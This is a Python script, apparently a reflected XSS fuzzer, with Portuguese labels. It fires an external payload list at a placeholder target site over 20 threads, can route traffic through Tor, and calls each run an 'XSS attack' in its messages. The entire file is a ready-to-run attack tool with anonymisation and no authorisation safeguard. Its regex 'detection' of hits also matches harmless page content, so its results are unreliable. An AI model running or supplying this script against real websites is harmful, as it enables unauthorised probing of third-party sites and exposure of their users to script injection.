import requests
import re
import concurrent.futures
from tqdm import tqdm
import os
import time
import sys

# ============ CONFIG ============
url = "https://seualvo.com"
payload_file_path = os.path.expanduser("~/xss-payload-list/Intruder/xss-payload-list.txt")
output_file = "xss_report.txt"
max_workers = 20
use_proxy = False
proxy_address = "socks5h://127.0.0.1:9050"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
}

proxies = {
    "http": proxy_address,
    "https": proxy_address
} if use_proxy else None

xss_indicators = [
    r"<script>.*?</script>",
    r"alert\(.*?\)",
    r"onerror=.*?",
    r"document.cookie",
    r"<svg.*?>"
]

# ============ FUNÇÃO DE TESTE ============
def test_payload(payload):
    try:
        response = requests.get(url, headers=headers, params={"input": payload}, proxies=proxies, timeout=5)
        for pattern in xss_indicators:
            if re.search(pattern, response.text, re.IGNORECASE):
                return {
                    "payload": payload,
                    "match": pattern,
                    "snippet": response.text[:250]
                }
    except:
        pass
    return None

# ============ MAIN ============
def main():
    try:
        with open(payload_file_path, "r") as file:
            payloads = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[ERRO] Arquivo não encontrado: {payload_file_path}")
        return

    resultados = []
    start = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_payload, p): p for p in payloads}
        for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="Executando ataque XSS", ncols=100, file=sys.stdout):
            result = future.result()
            if result:
                resultados.append(result)

    duration = time.time() - start
    with open(output_file, "w") as f:
        for item in resultados:
            f.write(f"Payload: {item['payload']}\nMatch: {item['match']}\nTrecho: {item['snippet']}\n{'-'*50}\n")

    print(f"\n✅ Ataque finalizado em {duration:.2f}s. {len(resultados)} payloads positivos. Resultados em '{output_file}'.")

if __name__ == "__main__":
    main()
